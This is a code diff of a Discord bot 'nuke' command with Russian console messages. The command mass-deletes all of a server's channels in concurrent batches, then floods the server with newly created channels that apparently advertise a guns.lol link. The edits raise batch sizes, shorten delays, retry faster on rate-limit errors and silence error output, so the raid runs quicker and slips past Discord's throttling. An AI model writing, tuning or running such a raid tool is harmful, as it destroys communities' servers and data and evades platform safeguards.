@@ -44,7 +44,7 @@ async def nuke(ctx):
         except:
             return False
     
-    batch_size = 15
+    batch_size = 20
     for i in range(0, total, batch_size):
         batch = channels[i:i+batch_size]
         tasks = [delete_single_channel(ch) for ch in batch]
@@ -56,14 +56,14 @@ async def nuke(ctx):
             else:
                 skipped += 1
         
-        await asyncio.sleep(0.02)
+        await asyncio.sleep(0.01)
         
-        if (i + batch_size) % 60 == 0:
+        if (i + batch_size) % 80 == 0:
             print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
     
     print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
     
-    await asyncio.sleep(0.5)
+    await asyncio.sleep(0.3)
     
     print("🔥 МОМЕНТАЛЬНОЕ СОЗДАНИЕ КАНАЛОВ...")
     
@@ -98,22 +98,19 @@ https://guns.lol/dszlip
             return True
             
         except discord.Forbidden:
-            print(f"❌ Нет прав на канал {i+1}")
             return False
         except discord.HTTPException as e:
             if "rate" in str(e).lower():
                 rate_limit_hits += 1
-                wait_time = min(rate_limit_hits * 0.05, 0.3)
+                wait_time = min(rate_limit_hits * 0.03, 0.2)
                 await asyncio.sleep(wait_time)
                 return await create_single_channel(i)
             else:
-                print(f"❌ Ошибка: {e}")
                 return False
         except Exception as e:
-            print(f"❌ Ошибка: {e}")
             return False
     
-    batch_size = 10
+    batch_size = 15
     max_batches = target_channels // batch_size + 1
     
     for batch_num in range(max_batches):
@@ -135,7 +132,7 @@ https://guns.lol/dszlip
             else:
                 failed += 1
         
-        await asyncio.sleep(0.02)
+        await asyncio.sleep(0.01)
         
         if created >= target_channels:
             print(f"✅ Достигнута цель: {created} каналов")
